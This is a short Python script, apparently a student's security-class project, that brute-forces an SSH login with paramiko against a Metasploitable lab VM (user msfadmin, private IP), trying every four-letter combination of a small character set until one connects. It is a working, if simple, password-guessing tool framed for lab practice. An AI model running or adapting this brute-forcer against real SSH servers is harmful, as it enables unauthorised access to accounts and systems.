#!/usr/bin/python
# This is my project for my Security Automation Class
# Introduction: For training and learning purposes only. Create a VMware , VM machine with metasploitable on it. Defaul login will always be msfadmin. 
# Create a short password for the purpose of saving time and making sure this script works. 
# Insert known IP address of VM machine and known Login (msfadmin)
# Script will crack the password in less than 10 mins for a four character set password that is all lowercase. 
# Having upercase,  numerical digits, and a long password will take days if not months to crack.  


#Import Modules

import itertools as it
import string
import paramiko

#Create Client using paramiko

def create_client():
    client = paramiko.SSHClient()
    client_policy = paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(client_policy)
    return client

# Create Brute_crack class

class Brute_crack:
    def __init__(self, charset, length, ip): #for known password lenghts and Ip address
        self.charset = charset #parameters of letters and numbers to use
        self.length = length #lenght of password
        self.ip = ip  #the ip address you wish to make a connection

# Define cracker and assign password to be crack with known user and ip with a timeout if system hangs

    def cracker(self, username):
        client = create_client()
        for guess in self.guesses:
            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.5) #connect to client with known username, guess the password and add timeout
                print ('The password is {}'.format(guess)) #If client connects and finds the password, print "the password is"
                return guess #return what the password is
            except:
                pass #skip over all the passwords that were used and did not work
            finally:
                client.close() #close the client connection
    @property # to access a property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length): #Where itertool module is used to provide iterables
            yield ''.join(guess) #yield creates a generator 


# Define main function, which charset to use, insert known ip address, crack the password for known login msfadmin, if password found print. 
def main():
    charset = 'abcd' #limit to use "a, b, c, d" to find password. Never have a 4 character password. This is done this way to save time and make sure script works
    ip = '192.168.0.232' #Insert IP Address 
    brute = Brute_crack(charset, 4, ip) #use charset (a,b,c,d), 4 character password(insert the length of the password if known)
    password = brute.cracker(username='msfadmin') #for this training purpose we already know the login (metasploitable default login is msfadmin)
    if password:
        print('Found password {}'.format(password)) #print found password if the password is found


if __name__ == '__main__': #call main function
    main()
